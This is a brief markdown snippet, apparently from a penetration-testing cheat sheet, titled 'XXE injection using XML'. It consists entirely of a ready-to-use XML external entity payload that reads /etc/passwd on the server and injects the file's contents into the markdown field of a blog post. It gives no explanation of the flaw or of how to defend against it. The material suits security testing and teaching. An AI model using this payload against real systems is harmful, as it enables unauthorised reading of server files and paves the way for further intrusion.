# XXE

#### XXE injection using XML

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
<title>LFI Post</title>
<description>Read File</description>
<markdown>&file;</markdown>
</post>
```
